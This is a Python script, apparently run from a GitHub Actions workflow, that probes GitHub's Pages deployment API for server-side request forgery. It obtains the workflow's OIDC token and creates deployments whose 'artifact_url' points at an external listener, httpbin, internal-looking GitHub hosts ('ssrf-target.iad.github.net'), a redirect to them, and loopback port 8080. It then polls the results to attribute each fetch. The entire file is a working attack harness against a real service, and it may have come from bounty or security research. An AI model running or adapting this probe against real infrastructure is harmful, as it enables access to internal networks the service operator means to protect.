import hashlib, json, os, ssl, sys, time, urllib.request, urllib.error
RUN=os.environ.get("GITHUB_RUN_ID","0"); REPO=os.environ["GITHUB_REPOSITORY"]
ART=os.environ.get("ART_ID","").strip(); GH=os.environ["GH_TOKEN"]
SINK=os.environ.get("SINK","").rstrip("/"); API="https://api.github.com"
def http(u,m="GET",b=None,h=None,t=30):
    r=urllib.request.Request(u,method=m,data=json.dumps(b).encode() if b is not None else None)
    for k,v in (h or {}).items(): r.add_header(k,v)
    if b is not None: r.add_header("Content-Type","application/json")
    try:
        with urllib.request.urlopen(r,timeout=t,context=ssl.create_default_context()) as z:
            return z.status,z.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")
    except Exception as e: return -1,f"<{type(e).__name__}:{e}>"
GHH={"Authorization":f"Bearer {GH}","Accept":"application/vnd.github+json","X-GitHub-Api-Version":"2022-11-28"}
def bv(tag): return hashlib.sha1(f"{RUN}-{tag}".encode()).hexdigest()   # distinct 40-hex per arm

print("=== ARMS2-START ===",flush=True)
try:
    idu=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); idt=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
    s,b=http(idu,h={"Authorization":f"bearer {idt}"}); tok=""
    try: tok=json.loads(b).get("value","") or ""
    except Exception: pass
    print(f"[oidc] HTTP {s} token_len={len(tok)}",flush=True)
    if len(tok)<20 or not ART:
        print("🔴 ARMING GATE FAILED (oidc or artifact-id absent). No verdict emitted.",flush=True); sys.exit(0)
    print(f"[rig] artifact_id(this run)={ART}  run={RUN}",flush=True)
    DEP=f"{API}/repos/{REPO}/pages/deployments"
    GN="https://ssrf-target.iad.github.net"; GF="https://ssrf-target-qq7x4z.iad.github.net"
    ARMS=[
      ("P_idonly   id only (POSITIVE CONTROL)", None),
      ("P_sink     public listener (FETCH PROOF)", f"{SINK}/B-sink-{RUN}"),
      ("P_pub200   httpbin status/200",         "https://httpbin.org/status/200"),
      ("P_pub404   httpbin status/404",         "https://httpbin.org/status/404"),
      ("P_nx       public NXDOMAIN",            f"https://zzq7x4z-nx-{RUN}.example.com/z.tar"),
      ("I_real     ghnet REAL name",            f"{GN}/z-{RUN}.tar"),
      ("I_fake     ghnet INVENTED twin",        f"{GF}/z-{RUN}.tar"),
      ("I_redir    redirect -> ghnet REAL",     f"https://httpbin.org/redirect-to?url={GN}/z-{RUN}.tar"),
      ("L_loop     loopback :8080",             f"http://127.0.0.1:8080/z-{RUN}.tar"),
    ]
    made={}
    for label,url in ARMS:
        tag=label.split()[0]
        body={"pages_build_version":bv(tag),"oidc_token":tok,"artifact_id":int(ART)}
        if url: body["artifact_url"]=url
        s,b=http(DEP,"POST",body,GHH); did=None
        try: did=json.loads(b).get("id")
        except Exception: pass
        if did: made[tag]=did
        print(f"  {label:<42} -> {s}  dep={str(did)[:16]}  {' '.join(b.split())[:120]}",flush=True)
        time.sleep(1.5)
    # SEPARABILITY GATE -- the whole point of this run
    print("\n=== SEPARABILITY GATE ===",flush=True)
    uniq=len(set(made.values()))
    print(f"  deployments created={len(made)}  distinct ids={uniq}",flush=True)
    if len(made)<2 or uniq!=len(made):
        print("🔴 VOID: ids are NOT distinct, so arms overwrote one object exactly as in run "
              "38691699068. Nothing below is attributable per-destination.",flush=True)
        sep=False
    else:
        print("✅ SEPARABLE: every arm owns its own deployment object; statuses are attributable.",flush=True)
        sep=True
    for wait in (15,40,75,120):
        time.sleep(wait if wait==15 else 25 if wait==40 else 35 if wait==75 else 45)
        print(f"  --- t+{wait}s  (separable={sep}) ---",flush=True)
        for tag,did in made.items():
            s,b=http(f"{API}/repos/{REPO}/pages/deployments/{did}",h=GHH)
            print(f"    {tag:<10} HTTP {s} {' '.join(b.split())[:150]}",flush=True)
finally:
    print("=== ARMS2-END ===",flush=True)
